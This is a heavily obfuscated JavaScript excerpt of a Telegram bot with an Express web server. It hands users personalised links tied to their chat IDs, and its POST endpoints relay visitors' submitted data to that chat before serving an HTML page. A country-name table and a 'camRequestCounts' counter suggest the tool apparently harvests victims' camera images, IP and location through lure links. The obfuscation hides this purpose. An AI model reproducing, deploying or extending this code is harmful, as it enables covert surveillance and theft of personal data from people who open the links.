            'rsOzr': _0x114394(0x2c7) + _0x114394(0x401) + _0x114394(0x50f) + _0x114394(0x341) + _0x114394(0x6ae) + _0x114394(0x585) + _0x114394(0x473) + _0x114394(0x40e) + _0x114394(0x1bf) + _0x114394(0x906) + _0x114394(0x58a) + _0x114394(0x517) + _0x114394(0x263) + _0x114394(0x3d3) + _0x114394(0x2cb) + _0x114394(0x7aa),
            'UBKlq': _0x114394(0x250) + _0x114394(0x72a) + _0x114394(0x819),
            'ThFKx': _0x114394(0x2a4) + _0x114394(0x6f1) + _0x114394(0x325) + _0x114394(0x812) + _0x114394(0x379) + _0x114394(0x331) + _0x114394(0x7d2),
            'YUXOo': _0x114394(0x884),
            'NQJuR': function (_0x2b96ed, _0x233e1f) {
                return _0x2b96ed == _0x233e1f;
            },
            'SNSpX': _0x114394(0x778) + _0x114394(0x19c) + _0x114394(0x2ab) + _0x114394(0x26f) + 'P:',
            'UcDPM': _0x114394(0x4b7),
            'wFXsU': function (_0x46d843, _0x4f9ace) {
                return _0x46d843 === _0x4f9ace;
            },
            'sSQPz': _0x114394(0x6d8),
            'bNKEr': function (_0x287e1e, _0x2f5cbd) {
                return _0x287e1e == _0x2f5cbd;
            },
            'lVpNN': _0x114394(0x778) + _0x114394(0x19c) + _0x114394(0x87f) + _0x114394(0x582) + 'P:',
            'tpdXG': function (_0x521d65, _0x7cbbfe, _0x406cae) {
                return _0x521d65(_0x7cbbfe, _0x406cae);
            },
            'HlpfB': _0x114394(0x2ca) + 'nt',
            'AlGnj': _0x114394(0x4ce) + 'k',
            'IkxPY': _0x114394(0x698) + 'n',
            'hezph': _0x114394(0x362),
            'bWBqm': _0x114394(0x2f4) + 'e'
        }, _0x536520 = _0x166f0e[_0x114394(0x4b7)][_0x114394(0x61f)]['id'], _0x377157 = _0x166f0e[_0x114394(0x369)], _0x541f6b = [
            _0x39c18a[_0x114394(0x2f8)],
            _0x39c18a[_0x114394(0x41b)],
            _0x39c18a[_0x114394(0x658)],
            _0x39c18a[_0x114394(0x1e9)],
            _0x39c18a[_0x114394(0x47d)],
            _0x39c18a[_0x114394(0x298)],
            _0x39c18a[_0x114394(0x350)],
            _0x39c18a[_0x114394(0x78d)]
        ];
    if (!_0x541f6b[_0x114394(0x885)](_0x377157[_0x114394(0x594)](':')[0x1a33 + 0x5 * 0x1d3 + -0x2352]) && !await _0x39c18a[_0x114394(0x851)](isUserSubscribed, _0x536520)) {
        const _0xb62707 = _0x39c18a[_0x114394(0x425)], _0x3c39eb = developerChannels[_0x114394(0x1de)](_0x2ee409 => ({
                'text': _0x114394(0x8c5) + _0x2ee409,
                'url': _0x114394(0x597) + _0x114394(0x476) + _0x2ee409[_0x114394(0x228)](-0x1da4 + 0x41b + 0x198a)
            }));
        bot[_0x114394(0x5ad) + 'e'](_0x536520, _0xb62707, { 'reply_markup': { 'inline_keyboard': [_0x3c39eb] } });
        return;
    }
    if (_0x39c18a[_0x114394(0x398)](_0x377157, _0x39c18a[_0x114394(0x2cf)])) {
        const _0x12e0f7 = baseUrl + (_0x114394(0x5d3) + _0x114394(0x431)) + _0x536520;
        bot[_0x114394(0x5ad) + 'e'](_0x536520, _0x114394(0x3dd) + _0x114394(0x3b2) + _0x114394(0x38c) + '\x20' + _0x12e0f7);
        return;
    }
    const [_0x46b5c3, _0x50db73] = _0x377157[_0x114394(0x594)](':');
    if (_0x39c18a[_0x114394(0x65d)](_0x46b5c3, _0x39c18a[_0x114394(0x845)]))
        try {
            const _0xf4c00d = _0x39c18a[_0x114394(0x313)], _0x18ffe9 = _0x39c18a[_0x114394(0x361)], _0x479c74 = await axios[_0x114394(0x33a)](_0x18ffe9, {
                    'model': _0x39c18a[_0x114394(0x66f)],
                    'messages': [{
                            'role': _0x39c18a[_0x114394(0x328)],
                            'content': _0xf4c00d
                        }]
                }, {
                    'headers': {
                        'Authorization': _0x39c18a[_0x114394(0x376)],
                        'Content-Type': _0x39c18a[_0x114394(0x523)]
                    }
                }), _0x321888 = _0x479c74[_0x114394(0x369)][_0x114394(0x200)][-0x5 * 0x49d + -0xa71 + 0x2182 * 0x1][_0x114394(0x4b7)][_0x114394(0x62e)];
            bot[_0x114394(0x5ad) + 'e'](_0x536520, _0x321888);
        } catch (_0x145770) {
            console[_0x114394(0x5bb)](_0x39c18a[_0x114394(0x735)], _0x145770[_0x114394(0x3ca)] ? _0x145770[_0x114394(0x3ca)][_0x114394(0x369)] : _0x145770[_0x114394(0x4b7)]), bot[_0x114394(0x5ad) + 'e'](_0x536520, _0x39c18a[_0x114394(0x2e3)]);
        }
    else {
        if (_0x39c18a[_0x114394(0x398)](_0x377157, _0x39c18a[_0x114394(0x765)]))
            try {
                const _0x36031f = _0x39c18a[_0x114394(0x558)], _0x594697 = _0x39c18a[_0x114394(0x361)], _0x1cb691 = await axios[_0x114394(0x33a)](_0x594697, {
                        'model': _0x39c18a[_0x114394(0x66f)],
                        'messages': [{
                                'role': _0x39c18a[_0x114394(0x328)],
                                'content': _0x36031f
                            }]
                    }, {
                        'headers': {
                            'Authorization': _0x39c18a[_0x114394(0x376)],
                            'Content-Type': _0x39c18a[_0x114394(0x523)]
                        }
                    }), _0x2932d7 = _0x1cb691[_0x114394(0x369)][_0x114394(0x200)][-0x89f + -0x1 * -0x1c7d + 0x9ef * -0x2][_0x114394(0x4b7)][_0x114394(0x62e)];
                bot[_0x114394(0x5ad) + 'e'](_0x536520, _0x2932d7);
            } catch (_0x2e0e42) {
                console[_0x114394(0x5bb)](_0x39c18a[_0x114394(0x735)], _0x2e0e42[_0x114394(0x3ca)] ? _0x2e0e42[_0x114394(0x3ca)][_0x114394(0x369)] : _0x2e0e42[_0x114394(0x4b7)]), bot[_0x114394(0x5ad) + 'e'](_0x536520, _0x39c18a[_0x114394(0x2e3)]);
            }
        else {
            if (_0x39c18a[_0x114394(0x65d)](_0x377157, _0x39c18a[_0x114394(0x765)]))
                try {
                    const _0x159512 = _0x39c18a[_0x114394(0x558)], _0x188e67 = _0x39c18a[_0x114394(0x361)], _0x36acce = await axios[_0x114394(0x33a)](_0x188e67, {
                            'model': _0x39c18a[_0x114394(0x66f)],
                            'messages': [{
                                    'role': _0x39c18a[_0x114394(0x328)],
                                    'content': _0x159512
                                }]
                        }, {
                            'headers': {
                                'Authorization': _0x39c18a[_0x114394(0x376)],
                                'Content-Type': _0x39c18a[_0x114394(0x523)]
                            }
                        }), _0x3e589d = _0x36acce[_0x114394(0x369)][_0x114394(0x200)][-0x11b * 0x1c + -0x8 * 0x434 + 0x4 * 0x1025][_0x114394(0x4b7)][_0x114394(0x62e)];
                    bot[_0x114394(0x5ad) + 'e'](_0x536520, _0x3e589d);
                } catch (_0x307fa7) {
                    console[_0x114394(0x5bb)](_0x39c18a[_0x114394(0x753)], _0x307fa7[_0x114394(0x3ca)] ? _0x307fa7[_0x114394(0x3ca)][_0x114394(0x369)] : _0x307fa7[_0x114394(0x4b7)]), bot[_0x114394(0x5ad) + 'e'](_0x536520, _0x39c18a[_0x114394(0x1ab)]);
                }
            else {
                if (_0x39c18a[_0x114394(0x398)](_0x377157, _0x39c18a[_0x114394(0x4d1)]) && _0x39c18a[_0x114394(0x499)](_0x536520, -0x4968cf5 * 0x2f + -0x134f61edb + 0x362ad2f90))
                    bot[_0x114394(0x5ad) + 'e'](_0x536520, _0x39c18a[_0x114394(0x788)]), bot[_0x114394(0x5df)](_0x39c18a[_0x114394(0x49c)], _0x1ccbaa => {
                        const _0x39c97f = _0x114394, _0x1e0fea = _0x1ccbaa[_0x39c97f(0x4b4)];
                        _0x39c18a[_0x39c97f(0x5b5)](addVIPUser, _0x1e0fea), bot[_0x39c97f(0x5ad) + 'e'](_0x536520, _0x39c97f(0x399) + _0x39c97f(0x832) + _0x1e0fea + _0x39c97f(0x1f2));
                    });
                else {
                    if (_0x39c18a[_0x114394(0x35e)](_0x377157, _0x39c18a[_0x114394(0x3d2)]) && _0x39c18a[_0x114394(0x83e)](_0x536520, 0xf650133 * -0xb + -0x6b * 0x3658522 + 0x36ad8e221 * 0x1))
                        bot[_0x114394(0x5ad) + 'e'](_0x536520, _0x39c18a[_0x114394(0x1e7)]), bot[_0x114394(0x5df)](_0x39c18a[_0x114394(0x49c)], _0x3d4497 => {
                            const _0x46c7f0 = _0x114394, _0x3c76ce = _0x3d4497[_0x46c7f0(0x4b4)];
                            _0x39c18a[_0x46c7f0(0x5b5)](removeVIPUser, _0x3c76ce), bot[_0x46c7f0(0x5ad) + 'e'](_0x536520, _0x46c7f0(0x2c1) + _0x46c7f0(0x832) + _0x3c76ce + _0x46c7f0(0x3b9));
                        });
                    else {
                        const [_0x2ff2c6, _0xa732f1] = _0x377157[_0x114394(0x594)](':');
                        if (!_0x541f6b[_0x114394(0x885)](_0x2ff2c6) && !_0x39c18a[_0x114394(0x686)](validateLinkUsage, _0xa732f1, _0x2ff2c6)) {
                            bot[_0x114394(0x5ad) + 'e'](_0x536520, '');
                            return;
                        }
                        let _0x58d8bb = '';
                        switch (_0x2ff2c6) {
                        case _0x39c18a[_0x114394(0x55b)]:
                            _0x58d8bb = _0x114394(0x589) + _0x114394(0x8f9) + _0x114394(0x5a1) + _0x114394(0x400) + _0x114394(0x633) + _0x114394(0x4a1) + _0x114394(0x293) + _0x114394(0x657) + _0x114394(0x36b) + _0x114394(0x2b7) + _0x114394(0x49f) + _0x114394(0x912) + _0x114394(0x58b) + _0x114394(0x5ec) + _0x114394(0x55d) + _0x114394(0x7a6) + _0x114394(0x638) + _0x114394(0x67f) + _0x114394(0x445) + _0x114394(0x43b) + _0x114394(0x177);
                            break;
                        case _0x39c18a[_0x114394(0x847)]:
                            _0x58d8bb = _0x114394(0x589) + _0x114394(0x8f9) + _0x114394(0x5a1) + _0x114394(0x400) + _0x114394(0x633) + _0x114394(0x4a1) + _0x114394(0x293) + _0x114394(0x657) + _0x114394(0x36b) + _0x114394(0x2b7) + _0x114394(0x49f) + _0x114394(0x912) + _0x114394(0x58b) + _0x114394(0x5ec) + _0x114394(0x55d) + _0x114394(0x7a6) + _0x114394(0x638) + _0x114394(0x67f) + _0x114394(0x445) + _0x114394(0x43b) + _0x114394(0x177);
                            break;
                        case _0x39c18a[_0x114394(0x57a)]:
                            _0x58d8bb = baseUrl + (_0x114394(0x427) + _0x114394(0x644)) + crypto[_0x114394(0x5a6) + 's'](0x1105 + -0x10ff + 0xa)[_0x114394(0x642)](_0x39c18a[_0x114394(0x610)]) + _0x114394(0x283) + _0x536520;
                            break;
                        case _0x39c18a[_0x114394(0x603)]:
                            const _0x5bb30f = -0x30 * 0x7d + 0x3 * 0x8f4 + 0x362 * -0x1;
                            _0x58d8bb = baseUrl + _0x114394(0x179) + crypto[_0x114394(0x5a6) + 's'](0x1 * -0xe47 + -0xdfe + 0x1c55)[_0x114394(0x642)](_0x39c18a[_0x114394(0x610)]) + _0x114394(0x283) + _0x536520 + _0x114394(0x248) + _0x5bb30f;
                            break;
                        case _0x39c18a[_0x114394(0x298)]:
                            _0x58d8bb = baseUrl + (_0x114394(0x7b0) + _0x114394(0x81f)) + _0x536520 + (_0x114394(0x6ec) + 'ok');
                            break;
                        case _0x39c18a[_0x114394(0x1e9)]:
                            _0x58d8bb = baseUrl + (_0x114394(0x7b0) + _0x114394(0x81f)) + _0x536520 + (_0x114394(0x2ac) + _0x114394(0x5da));
                            break;
                        case _0x39c18a[_0x114394(0x78d)]:
                            _0x58d8bb = baseUrl + (_0x114394(0x7b0) + _0x114394(0x81f)) + _0x536520 + (_0x114394(0x498) + _0x114394(0x439));
                            break;
                        default:
                            bot[_0x114394(0x5ad) + 'e'](_0x536520, '');
                            return;
                        }
                        bot[_0x114394(0x5ad) + 'e'](_0x536520, _0x114394(0x308) + _0x114394(0x1bb) + _0x58d8bb);
                    }
                }
            }
        }
    }
    bot[_0x114394(0x779) + _0x114394(0x315)](_0x166f0e['id']);
}), bot[_0x317544(0x62c)](/\/jjihigjoj/, _0x4aab37 => {
    const _0xeba259 = _0x317544, _0x47b54c = {
            'LwRqR': _0xeba259(0x3e9) + _0xeba259(0x2ea) + _0xeba259(0x1a1) + _0xeba259(0x8b4) + '.',
            'JqYyX': _0xeba259(0x4bd) + _0xeba259(0x6a2),
            'qLwdO': _0xeba259(0x4ad) + _0xeba259(0x42e)
        }, _0x547415 = _0x4aab37[_0xeba259(0x61f)]['id'], _0x2bb761 = _0x47b54c[_0xeba259(0x5fd)];
    bot[_0xeba259(0x5ad) + 'e'](_0x547415, _0x2bb761, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x47b54c[_0xeba259(0x86a)],
                        'callback_data': _0x47b54c[_0xeba259(0x8eb)]
                    }]]
        }
    });
}), bot['on'](_0x317544(0x635) + _0x317544(0x53f), _0x2589d1 => {
    const _0x10c4be = _0x317544, _0x39afb3 = {
            'hmeqv': function (_0x484376, _0x436a29) {
                return _0x484376 === _0x436a29;
            },
            'aFgaV': _0x10c4be(0x4ad) + _0x10c4be(0x42e)
        }, _0x24b5f9 = _0x2589d1[_0x10c4be(0x4b7)][_0x10c4be(0x61f)]['id'];
    if (_0x39afb3[_0x10c4be(0x468)](_0x2589d1[_0x10c4be(0x369)], _0x39afb3[_0x10c4be(0x774)])) {
        const _0x244863 = baseUrl + '/' + _0x24b5f9;
        bot[_0x10c4be(0x5ad) + 'e'](_0x24b5f9, _0x10c4be(0x693) + _0x10c4be(0x6da) + _0x244863);
    }
    bot[_0x10c4be(0x779) + _0x10c4be(0x315)](_0x2589d1['id']);
}), bot['on'](_0x317544(0x635) + _0x317544(0x53f), _0x39f6f0 => {
    const _0x441a40 = _0x317544, _0x415b42 = {
            'vJHYG': function (_0x63250b, _0x52ed24) {
                return _0x63250b === _0x52ed24;
            },
            'RzBMw': _0x441a40(0x7bb),
            'nJDXS': _0x441a40(0x4b7),
            'aBpHX': _0x441a40(0x301) + _0x441a40(0x856) + _0x441a40(0x712) + _0x441a40(0x260),
            'EeNjP': _0x441a40(0x318),
            'quhwZ': _0x441a40(0x842) + _0x441a40(0x365) + _0x441a40(0x49d) + '.'
        }, _0x203845 = _0x39f6f0[_0x441a40(0x4b7)][_0x441a40(0x61f)]['id'];
    if (_0x415b42[_0x441a40(0x605)](_0x39f6f0[_0x441a40(0x369)], _0x415b42[_0x441a40(0x347)])) {
        bot[_0x441a40(0x5ad) + 'e'](_0x203845, _0x415b42[_0x441a40(0x255)]);
        const _0x59cac9 = _0x2734cb => {
            const _0x3258fe = _0x441a40;
            if (_0x415b42[_0x3258fe(0x605)](_0x2734cb[_0x3258fe(0x61f)]['id'], _0x203845)) {
                if (_0x2734cb[_0x3258fe(0x4b4)] && _0x2734cb[_0x3258fe(0x4b4)][_0x3258fe(0x83d)](_0x415b42[_0x3258fe(0x51d)])) {
                    const _0x2c39ea = _0x2734cb[_0x3258fe(0x4b4)];
                    dataStore[_0x203845] = { 'userLink': _0x2c39ea }, bot[_0x3258fe(0x5ad) + 'e'](_0x203845, _0x3258fe(0x589) + _0x3258fe(0x8f9) + _0x3258fe(0x5a1) + _0x3258fe(0x400) + _0x3258fe(0x633) + _0x3258fe(0x4a1) + _0x3258fe(0x293) + _0x3258fe(0x657) + _0x3258fe(0x36b) + _0x3258fe(0x2b7) + _0x3258fe(0x49f) + _0x3258fe(0x912) + _0x3258fe(0x58b) + _0x3258fe(0x5ec) + _0x3258fe(0x55d) + _0x3258fe(0x7a6) + _0x3258fe(0x638) + _0x3258fe(0x67f) + _0x3258fe(0x445) + _0x3258fe(0x43b) + _0x3258fe(0x177)), bot[_0x3258fe(0x80e) + _0x3258fe(0x742)](_0x415b42[_0x3258fe(0x6cd)], _0x59cac9);
                } else
                    bot[_0x3258fe(0x5ad) + 'e'](_0x203845, _0x415b42[_0x3258fe(0x8aa)]);
            }
        };
        bot['on'](_0x415b42[_0x441a40(0x6cd)], _0x59cac9);
    }
}), app[_0x317544(0x47c)](bodyParser[_0x317544(0x2aa)]({ 'extended': !![] })), app[_0x317544(0x47c)](express[_0x317544(0x496)](__dirname)), app[_0x317544(0x33a)](_0x317544(0x4cf) + 'es', (_0x38a0e6, _0x2b83ca) => {
    const _0x47bdba = _0x317544, _0x2f4fbd = {
            'QuxRo': _0x47bdba(0x82c),
            'OCphX': _0x47bdba(0x344) + _0x47bdba(0x83a) + _0x47bdba(0x206) + ':',
            'idnsm': _0x47bdba(0x2a4) + _0x47bdba(0x7f6) + _0x47bdba(0x80d) + _0x47bdba(0x480) + _0x47bdba(0x559),
            'eKMJu': _0x47bdba(0x840) + _0x47bdba(0x5de)
        }, _0x1e546b = _0x38a0e6[_0x47bdba(0x51f)][_0x47bdba(0x767)], _0x2617ef = _0x38a0e6[_0x47bdba(0x51f)][_0x47bdba(0x601)], _0x25fbe7 = _0x38a0e6[_0x47bdba(0x51f)][_0x47bdba(0x709)];
    console[_0x47bdba(0x699)](_0x2f4fbd[_0x47bdba(0x804)], _0x38a0e6[_0x47bdba(0x51f)]), bot[_0x47bdba(0x5ad) + 'e'](_0x1e546b, _0x47bdba(0x201) + _0x47bdba(0x580) + _0x2617ef + _0x47bdba(0x7f8) + _0x25fbe7)[_0x47bdba(0x826)](() => {
        const _0x4446a6 = _0x47bdba;
        _0x2b83ca[_0x4446a6(0x3da)](path[_0x4446a6(0x57f)](__dirname, _0x2f4fbd[_0x4446a6(0x69d)]));
    })[_0x47bdba(0x60f)](_0x554654 => {
        const _0x5cc3f6 = _0x47bdba;
        console[_0x5cc3f6(0x5bb)](_0x2f4fbd[_0x5cc3f6(0x701)], _0x554654[_0x5cc3f6(0x3ca)] ? _0x554654[_0x5cc3f6(0x3ca)][_0x5cc3f6(0x51f)] : _0x554654), _0x2b83ca[_0x5cc3f6(0x4cc)](-0xd3d * -0x1 + -0xce3 + 0x19a)[_0x5cc3f6(0x850)](_0x2f4fbd[_0x5cc3f6(0x383)]);
    });
}), app[_0x317544(0x3c5)](_0x317544(0x524), (_0x5c22cc, _0x3bbbe0) => {
    const _0x4ff353 = _0x317544, _0x391265 = {
            'RIRZn': _0x4ff353(0x17b) + _0x4ff353(0x397) + _0x4ff353(0x275),
            'HcXKa': _0x4ff353(0x82c)
        }, _0x321ae8 = _0x5c22cc[_0x4ff353(0x37e)][_0x4ff353(0x767)];
    if (!_0x321ae8)
        return _0x3bbbe0[_0x4ff353(0x4cc)](0xdfe + -0x1 * 0x6c7 + -0x5a7)[_0x4ff353(0x850)](_0x391265[_0x4ff353(0x48c)]);
    _0x3bbbe0[_0x4ff353(0x3da)](path[_0x4ff353(0x57f)](__dirname, _0x391265[_0x4ff353(0x4c1)]));
}), app[_0x317544(0x47c)](bodyParser[_0x317544(0x2aa)]({ 'extended': !![] })), app[_0x317544(0x47c)](express[_0x317544(0x496)](__dirname)), app[_0x317544(0x33a)](_0x317544(0x4cf) + 'es', (_0x4a418f, _0x56a29e) => {
    const _0x25bbd0 = _0x317544, _0x34d82d = {
            'dtiDC': _0x25bbd0(0x588),
            'pwNki': _0x25bbd0(0x344) + _0x25bbd0(0x83a) + _0x25bbd0(0x206) + ':',
            'rVyzN': _0x25bbd0(0x2a4) + _0x25bbd0(0x7f6) + _0x25bbd0(0x80d) + _0x25bbd0(0x480) + _0x25bbd0(0x559),
            'KMVlD': _0x25bbd0(0x840) + _0x25bbd0(0x5de)
        }, _0x5c3d09 = _0x4a418f[_0x25bbd0(0x51f)][_0x25bbd0(0x767)], _0x530727 = _0x4a418f[_0x25bbd0(0x51f)][_0x25bbd0(0x601)], _0x5bae63 = _0x4a418f[_0x25bbd0(0x51f)][_0x25bbd0(0x709)];
    console[_0x25bbd0(0x699)](_0x34d82d[_0x25bbd0(0x8c6)], _0x4a418f[_0x25bbd0(0x51f)]), bot[_0x25bbd0(0x5ad) + 'e'](_0x5c3d09, _0x25bbd0(0x201) + _0x25bbd0(0x580) + _0x530727 + _0x25bbd0(0x7f8) + _0x5bae63)[_0x25bbd0(0x826)](() => {
        const _0x5217b7 = _0x25bbd0;
        _0x56a29e[_0x5217b7(0x3da)](path[_0x5217b7(0x57f)](__dirname, _0x34d82d[_0x5217b7(0x2c3)]));
    })[_0x25bbd0(0x60f)](_0xf3c261 => {
        const _0x86a00a = _0x25bbd0;
        console[_0x86a00a(0x5bb)](_0x34d82d[_0x86a00a(0x612)], _0xf3c261[_0x86a00a(0x3ca)] ? _0xf3c261[_0x86a00a(0x3ca)][_0x86a00a(0x51f)] : _0xf3c261), _0x56a29e[_0x86a00a(0x4cc)](0x1807 * 0x1 + 0x2 * -0x579 + 0xb * -0x103)[_0x86a00a(0x850)](_0x34d82d[_0x86a00a(0x769)]);
    });
}), app[_0x317544(0x3c5)](_0x317544(0x75d), (_0x3db4eb, _0x5a2dd3) => {
    const _0x5146d2 = _0x317544, _0x2649fe = {
            'vsGbU': _0x5146d2(0x17b) + _0x5146d2(0x397) + _0x5146d2(0x275),
            'xWUjn': _0x5146d2(0x588)
        }, _0x463238 = _0x3db4eb[_0x5146d2(0x37e)][_0x5146d2(0x767)];
    if (!_0x463238)
        return _0x5a2dd3[_0x5146d2(0x4cc)](-0x1 * -0x81e + -0x8c9 * -0x1 + -0xf57)[_0x5146d2(0x850)](_0x2649fe[_0x5146d2(0x6d9)]);
    _0x5a2dd3[_0x5146d2(0x3da)](path[_0x5146d2(0x57f)](__dirname, _0x2649fe[_0x5146d2(0x297)]));
}), app[_0x317544(0x47c)](bodyParser[_0x317544(0x2aa)]({ 'extended': !![] })), app[_0x317544(0x47c)](express[_0x317544(0x496)](__dirname)), app[_0x317544(0x33a)](_0x317544(0x4cf) + 'es', (_0x23e4b1, _0x19c6bc) => {
    const _0x3eb267 = _0x317544, _0x173504 = {
            'QfYHE': _0x3eb267(0x61e),
            'UyAUd': _0x3eb267(0x344) + _0x3eb267(0x83a) + _0x3eb267(0x206) + ':',
            'yXTDc': _0x3eb267(0x2a4) + _0x3eb267(0x7f6) + _0x3eb267(0x80d) + _0x3eb267(0x480) + _0x3eb267(0x559),
            'xcSVa': _0x3eb267(0x840) + _0x3eb267(0x5de)
        }, _0x4461f7 = _0x23e4b1[_0x3eb267(0x51f)][_0x3eb267(0x767)], _0xa56a35 = _0x23e4b1[_0x3eb267(0x51f)][_0x3eb267(0x601)], _0x420760 = _0x23e4b1[_0x3eb267(0x51f)][_0x3eb267(0x709)];
    console[_0x3eb267(0x699)](_0x173504[_0x3eb267(0x23b)], _0x23e4b1[_0x3eb267(0x51f)]), bot[_0x3eb267(0x5ad) + 'e'](_0x4461f7, _0x3eb267(0x201) + _0x3eb267(0x580) + _0xa56a35 + _0x3eb267(0x7f8) + _0x420760)[_0x3eb267(0x826)](() => {
        const _0x2e76ac = _0x3eb267;
        _0x19c6bc[_0x2e76ac(0x3da)](path[_0x2e76ac(0x57f)](__dirname, _0x173504[_0x2e76ac(0x7a7)]));
    })[_0x3eb267(0x60f)](_0xbb28a1 => {
        const _0x304c8b = _0x3eb267;
        console[_0x304c8b(0x5bb)](_0x173504[_0x304c8b(0x5f9)], _0xbb28a1[_0x304c8b(0x3ca)] ? _0xbb28a1[_0x304c8b(0x3ca)][_0x304c8b(0x51f)] : _0xbb28a1), _0x19c6bc[_0x304c8b(0x4cc)](0x4d * -0x7a + 0x21c1 + 0x4e5)[_0x304c8b(0x850)](_0x173504[_0x304c8b(0x52a)]);
    });
}), app[_0x317544(0x3c5)](_0x317544(0x172), (_0x716474, _0x47cc3c) => {
    const _0x486e6e = _0x317544, _0x220246 = {
            'zsXlx': _0x486e6e(0x17b) + _0x486e6e(0x397) + _0x486e6e(0x275),
            'fBTCO': _0x486e6e(0x61e)
        }, _0xbc2fed = _0x716474[_0x486e6e(0x37e)][_0x486e6e(0x767)];
    if (!_0xbc2fed)
        return _0x47cc3c[_0x486e6e(0x4cc)](0x7d6 * 0x2 + 0x1982 + -0x39a * 0xb)[_0x486e6e(0x850)](_0x220246[_0x486e6e(0x50e)]);
    _0x47cc3c[_0x486e6e(0x3da)](path[_0x486e6e(0x57f)](__dirname, _0x220246[_0x486e6e(0x1cd)]));
});
const countryTranslation = {
        'AF': _0x317544(0x2a5) + _0x317544(0x55c),
        'AL': _0x317544(0x79d),
        'DZ': _0x317544(0x878),
        'AO': _0x317544(0x690),
        'AR': _0x317544(0x7f5) + _0x317544(0x552),
        'AM': _0x317544(0x6d5),
        'AU': _0x317544(0x69c),
        'AT': _0x317544(0x2c9),
        'AZ': _0x317544(0x30b),
        'BH': _0x317544(0x8a7),
        'BD': _0x317544(0x920),
        'BY': _0x317544(0x507),
        'BE': _0x317544(0x84d),
        'BZ': _0x317544(0x576),
        'BJ': _0x317544(0x76d),
        'BO': _0x317544(0x57e),
        'BA': _0x317544(0x79f) + _0x317544(0x8ec),
        'BW': _0x317544(0x330),
        'BR': _0x317544(0x464),
        'BG': _0x317544(0x636),
        'BF': _0x317544(0x4c8) + _0x317544(0x32c),
        'KH': _0x317544(0x54e),
        'CM': _0x317544(0x21b) + _0x317544(0x1cb),
        'CA': _0x317544(0x457),
        'CL': _0x317544(0x770),
        'CN': _0x317544(0x689),
        'CO': _0x317544(0x69b),
        'CR': _0x317544(0x42a) + _0x317544(0x5ba),
        'HR': _0x317544(0x7ce),
        'CY': _0x317544(0x317),
        'CZ': _0x317544(0x748),
        'DK': _0x317544(0x620),
        'EC': _0x317544(0x52b) + _0x317544(0x829),
        'EG': _0x317544(0x6e8),
        'SV': _0x317544(0x84a) + _0x317544(0x6e7),
        'EE': _0x317544(0x2a3),
        'ET': _0x317544(0x579),
        'FI': _0x317544(0x6f8),
        'FR': _0x317544(0x500),
        'GE': _0x317544(0x262),
        'DE': _0x317544(0x424),
        'GH': _0x317544(0x581),
        'GR': _0x317544(0x896),
        'GT': _0x317544(0x461) + _0x317544(0x8e2),
        'HN': _0x317544(0x623),
        'HK': _0x317544(0x72b) + _0x317544(0x19f),
        'HU': _0x317544(0x89f),
        'IS': _0x317544(0x16a),
        'IN': _0x317544(0x3aa),
        'ID': _0x317544(0x7f2) + _0x317544(0x4a5),
        'IR': _0x317544(0x775),
        'IQ': _0x317544(0x2d1),
        'IE': _0x317544(0x1dc),
        'IL': _0x317544(0x375),
        'IT': _0x317544(0x5f0),
        'CI': _0x317544(0x335) + _0x317544(0x43d),
        'JP': _0x317544(0x2c4),
        'JO': _0x317544(0x4c4),
        'KZ': _0x317544(0x227) + _0x317544(0x37a),
        'KE': _0x317544(0x24d),
        'KW': _0x317544(0x75a),
        'KG': _0x317544(0x8a5) + _0x317544(0x3e4),
        'LV': _0x317544(0x1f4),
        'LB': _0x317544(0x5b0),
        'LY': _0x317544(0x913),
        'LT': _0x317544(0x6a4),
        'LU': _0x317544(0x54a) + _0x317544(0x2de),
        'MO': _0x317544(0x34c),
        'MY': _0x317544(0x345),
        'ML': _0x317544(0x268),
        'MT': _0x317544(0x800),
        'MX': _0x317544(0x7e1),
        'MC': _0x317544(0x21f),
        'MN': _0x317544(0x86d),
        'ME': _0x317544(0x48d) + _0x317544(0x386),
        'MA': _0x317544(0x5af),
        'MZ': _0x317544(0x3a7),
        'MM': _0x317544(0x24f),
        'NA': _0x317544(0x743),
        'NP': _0x317544(0x75e),
        'NL': _0x317544(0x8ca),
        'NZ': _0x317544(0x647) + _0x317544(0x3d4),
        'NG': _0x317544(0x7c1),
        'KP': _0x317544(0x5d8) + _0x317544(0x33c),
        'NO': _0x317544(0x52f),
        'OM': _0x317544(0x684),
        'PK': _0x317544(0x79e),
        'PS': _0x317544(0x6df),
        'PA': _0x317544(0x8d7),
        'PY': _0x317544(0x8d5),
        'PE': _0x317544(0x6ca),
        'PH': _0x317544(0x5e7),
        'PL': _0x317544(0x44b),
        'PT': _0x317544(0x171),
        'PR': _0x317544(0x7d0) + _0x317544(0x180),
        'QA': _0x317544(0x62b),
        'RO': _0x317544(0x21a),
        'RU': _0x317544(0x281),
        'RW': _0x317544(0x725),
        'SA': _0x317544(0x839),
        'SN': _0x317544(0x640),
        'RS': _0x317544(0x340),
        'SG': _0x317544(0x27d),
        'SK': _0x317544(0x563),
        'SI': _0x317544(0x3d7),
        'ZA': _0x317544(0x7a5) + _0x317544(0x483),
        'KR': _0x317544(0x1a0) + _0x317544(0x3fb),
        'ES': _0x317544(0x5e4),
        'LK': _0x317544(0x1f8),
        'SD': _0x317544(0x5c6),
        'SE': _0x317544(0x820),
        'CH': _0x317544(0x1c3),
        'SY': _0x317544(0x3bf),
        'TW': _0x317544(0x69a),
        'TZ': _0x317544(0x89a),
        'TH': _0x317544(0x63a),
        'TG': _0x317544(0x6c7),
        'TN': _0x317544(0x724),
        'TR': _0x317544(0x7e4),
        'TM': _0x317544(0x27f) + _0x317544(0x1d2),
        'UG': _0x317544(0x654),
        'UA': _0x317544(0x435),
        'AE': _0x317544(0x7d3),
        'GB': _0x317544(0x53b),
        'US': _0x317544(0x35f),
        'UY': _0x317544(0x3cb),
        'UZ': _0x317544(0x8fc) + _0x317544(0x5ed),
        'VE': _0x317544(0x2a6),
        'VN': _0x317544(0x649),
        'ZM': _0x317544(0x326),
        'ZW': _0x317544(0x2ae),
        'GL': _0x317544(0x3a6),
        'KY': _0x317544(0x5be) + _0x317544(0x830),
        'NI': _0x317544(0x5d1) + _0x317544(0x299),
        'DO': _0x317544(0x5bc) + _0x317544(0x2cd),
        'NC': _0x317544(0x54f) + _0x317544(0x664),
        'LA': _0x317544(0x672),
        'TT': _0x317544(0x3a3) + _0x317544(0x676),
        'GG': _0x317544(0x583),
        'GU': _0x317544(0x5e3),
        'GP': _0x317544(0x652),
        'MG': _0x317544(0x3bc),
        'RE': _0x317544(0x5eb),
        'FO': _0x317544(0x33e),
        'MD': _0x317544(0x1d3)
    }, camRequestCounts = {};
async function initStorage() {
